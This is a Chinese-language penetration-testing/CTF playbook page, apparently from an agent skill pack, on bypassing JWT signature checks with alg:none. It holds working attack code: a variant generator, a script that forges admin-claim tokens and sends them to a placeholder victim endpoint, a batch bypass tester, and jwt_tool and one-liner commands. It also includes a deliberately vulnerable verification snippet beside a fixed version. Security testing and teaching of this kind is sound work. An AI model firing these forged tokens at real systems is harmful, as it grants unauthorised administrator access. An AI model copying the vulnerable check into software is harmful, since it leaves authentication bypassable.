# JWT `alg: none` 无签名绕过

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/02-auth/jwt/01-alg-none.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **能力域**：本文为技术能力说明，按项目 `scope.md` 直接套用。
> **什么时候用**：命中「alg:none / none算法 / 无签名 / 签名绕过」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- alg:none
- none算法
- 无签名
- 签名绕过
- JWT
- jwt_tool

## 前置

- 前置：目标可达；测试时段与限速已约定（打快了会把自己变成 DoS）。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。

## 步骤

1. **检测信号** — `alg` 改为 `none` 后，响应从 `401/403` 变为 `200`
2. **检测信号** — 错误信息出现 `"alg None is not allowed"` 说明库已防护
3. **检测信号** — 无任何异常响应时 → 大概率签名根本没被验证（直接进入 §2.4）

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **输入信号** — Header 中 `alg` 为 `HS256/RS256/ES256`，但错误信息会回显算法名
- **输入信号** — 篡改 payload 后不是固定 `401`，而是进入业务错误、跳转或不同 JSON
- **输入信号** — Token 末尾 signature 为空、缺失、补一个点后，服务端仍尝试解析
- **输入信号** — 旧库、CTF 题、调试环境、网关和后端都解析 JWT，存在双解析窗口
- **Evidence** — `alg_none_matrix.json`: 原 token、header 变体、signature 形态、状态码、body hash、身份字段。
- **Evidence** — `oracle_diff.md`（本包未落地）: 普通 token、none token、篡改但仍签名错误 token 的响应差异。
- **Evidence** — 成功样本: `alg=none` 后 `sub/role/isAdmin` 生效，接口返回管理员数据、订单/flag 或更高权限菜单。
- **Evidence** — 失败样本: 明确 `none not allowed`、`signature required`、所有变体同一 `401` body hash。
- **Evidence** — 下一跳: 如果 none 失败但算法名被信任，转 `02-algorithm-confusion`；如果错误跟 `kid` 变化，转 `04-kid-injection`。

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

## 输入信号

- Header 中 `alg` 为 `HS256/RS256/ES256`，但错误信息会回显算法名
- 篡改 payload 后不是固定 `401`，而是进入业务错误、跳转或不同 JSON
- Token 末尾 signature 为空、缺失、补一个点后，服务端仍尝试解析
- 旧库、CTF 题、调试环境、网关和后端都解析 JWT，存在双解析窗口

## 0. 判定矩阵

| 变体 | Header | Signature | 命中样本 | 失败样本 |
|------|--------|-----------|----------|----------|
| 标准 none | `{"alg":"none"}` | 空字符串 | 返回高权限数据 | `alg none not allowed` |
| 大小写 | `None`, `NONE`, `nOnE` | 空字符串 | 库归一化后跳过验证 | `invalid algorithm` |
| 空算法 | `{"alg":""}` | 空字符串 | fallback 到 none 分支 | `missing alg` |
| 缺失算法 | 无 `alg` | 空字符串 | 网关解析、后端信任 payload | `malformed token` |
| 双点 token | `header.payload.` | 空字符串 | 业务身份变化 | signature required |

核心 oracle：同一接口、同一会话下，只有 token 变体不同；如果身份、权限、订单、flag 或响应字段稳定变化，才进入下一步。

### 0.1 none 变体生成器

```python
# jwt_none_variants.py — none/空签名变体
import base64
import json

def b64u(obj):
    raw = json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

def none_variants(payload):
    headers = [
        {"alg": "none", "typ": "JWT"},
        {"alg": "None", "typ": "JWT"},
        {"alg": "NONE", "typ": "JWT"},
        {"alg": "", "typ": "JWT"},
        {"typ": "JWT"},
    ]
    bodies = [
        payload,
        {**payload, "role": "admin"},
        {**payload, "isAdmin": True},
        {**payload, "exp": 4102444800},
    ]
    for h in headers:
        for p in bodies:
            yield f"{b64u(h)}.{b64u(p)}."
```

记录 `none_oracle.jsonl`：`variant_id`、header、payload diff、signature 形态、状态码、响应 hash、业务字段。若 none 失败但 claim 变体导致业务字段变化，转 `06-claim-missing.md`；若错误提示暴露 allowed algorithms，转 `02-algorithm-confusion.md`。

## 原理

JWT 规范 (RFC 7519) 允许 `alg: "none"` 表示不签名，用于调试场景。如果服务端的 JWT 库**未显式禁用 `none` 算法**，攻击者可将 Header 的 `alg` 改为 `none`，Payload 任意伪造，Signature 留空，服务端照单全收。

```
┌─────────────────────────────────────────────────────┐
│ 正常流程                                             │
│   Client ─[HS256 Token]──▶ Server                   │
│           Header{alg:HS256}                          │
│           Payload{sub:user}                          │
│           Sig{HMAC(K, H.P)}                          │
│                               verify(H.P, Sig, K)   │
│                               ✓ → 200               │
├─────────────────────────────────────────────────────┤
│ 攻击流程                                             │
│   Attacker ─[none Token]──▶ Server                  │
│             Header{alg:none}                         │
│             Payload{sub:admin,role:admin}            │
│             Sig{}  ← 空或任意值                      │
│                               verify()?             │
│                               若未禁用none → skip    │
│                               ✗ → 200 (绕过!)        │
└─────────────────────────────────────────────────────┘
```

## 伪代码：服务端漏洞逻辑

```python
# 漏洞代码（简化）
def verify_token(token):
    header = b64decode(token.split('.')[0])
    payload = b64decode(token.split('.')[1])
    sig = token.split('.')[2]

    if header['alg'] == 'none':
        # BUG: 直接返回 payload，未验证签名
        return payload

    if header['alg'] == 'HS256':
        key = get_secret_key()
        expected = hmac_sha256(header + '.' + payload, key)
        if sig == expected:
            return payload
    return None
```

```python
# 正确代码
ALLOWED_ALGORITHMS = ['HS256', 'RS256']  # 固定白名单，不含 none

def verify_token(token):
    header = b64decode(token.split('.')[0])
    if header['alg'] not in ALLOWED_ALGORITHMS:
        raise InvalidAlgorithmError(f"Algorithm {header['alg']} not allowed")
    # ... 正常验证
```

## 伪代码：攻击脚本

```python
# attack_alg_none.py
import base64
import json
import requests

def b64url_encode(data: dict) -> str:
    """Base64URL 编码，去掉末尾 ="""
    json_str = json.dumps(data, separators=(',', ':'))
    return base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode()

def forge_token(payload: dict) -> str:
    """
    伪造 alg=none 的 JWT
    """
    header = {"alg": "none", "typ": "JWT"}
    encoded_header = b64url_encode(header)
    encoded_payload = b64url_encode(payload)
    # Signature 留空
    return f"{encoded_header}.{encoded_payload}."

# --- 攻击入口 ---
TARGET = "https://victim.com/api/admin"

# 原始低权限 token（可选，仅用于对比）
original_token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.xxx"

# 构造高权限 token
malicious_payload = {
    "sub": "admin",
    "role": "admin",
    "isAdmin": True,
    "iat": 9999999999       # 时间戳随意
}
forged = forge_token(malicious_payload)

# 发送
resp = requests.get(TARGET, headers={"Authorization": f"Bearer {forged}"})
if resp.status_code == 200 and "admin" in resp.text:
    print(f"[+] Bypass success! Token: {forged}")
else:
    print(f"[-] Failed: {resp.status_code}")
```

## 伪代码：变种绕过

```python
# 变种 1: 大小写混淆
HEADER_VARIANTS = [
    {"alg": "none"},       # 标准
    {"alg": "None"},       # 大写 N
    {"alg": "NONE"},       # 全大写
    {"alg": "NoNe"},       # 混合
]

# 变种 2: 算法数组注入（部分库解析缺陷）
HEADER_VARIANT_ARRAY = {"alg": ["none", "HS256"]}
# 解释: 库取 alg[0] 判断算法，但取 alg[1] 做验证 → 冲突

# 变种 3: 空 alg
HEADER_VARIANT_EMPTY = {"alg": ""}

# 变种 4: 不存在的算法
HEADER_VARIANT_FAKE = {"alg": "FAKE"}

# 批量测试
def test_all_variants(target_url, payload):
    variants = [
        {"alg": "none"}, {"alg": "None"}, {"alg": "NONE"},
        {"alg": "NoNe"}, {"alg": ["none", "HS256"]},
        {"alg": ""},     {"alg": "FAKE"},
    ]
    for header in variants:
        token = b64url_encode(header) + "." + b64url_encode(payload) + "."
        resp = requests.get(target_url, headers={"Authorization": f"Bearer {token}"})
        print(f"  {header['alg']!r:20s} → {resp.status_code}")
        if resp.status_code not in (401, 403):
            print(f"    [!] Possible bypass!")
```

## 检测信号

- `alg` 改为 `none` 后，响应从 `401/403` 变为 `200`
- 错误信息出现 `"alg None is not allowed"` 说明库已防护
- 无任何异常响应时 → 大概率签名根本没被验证（直接进入 §2.4）

## 工具命令

```bash
# jwt_tool alg=none 扫描
python jwt_tool.py <token> -X n

# 手动构造
python -c "
import base64,json
h=base64.urlsafe_b64encode(json.dumps({'alg':'none'}).encode()).rstrip(b'=').decode()
p=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
print(f'{h}.{p}.')
"
```

## 工作流

捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。


## Evidence

- `alg_none_matrix.json`: 原 token、header 变体、signature 形态、状态码、body hash、身份字段。
- `oracle_diff.md`（本包未落地）: 普通 token、none token、篡改但仍签名错误 token 的响应差异。
- 成功样本: `alg=none` 后 `sub/role/isAdmin` 生效，接口返回管理员数据、订单/flag 或更高权限菜单。
- 失败样本: 明确 `none not allowed`、`signature required`、所有变体同一 `401` body hash。
- 下一跳: 如果 none 失败但算法名被信任，转 `02-algorithm-confusion`；如果错误跟 `kid` 变化，转 `04-kid-injection`。
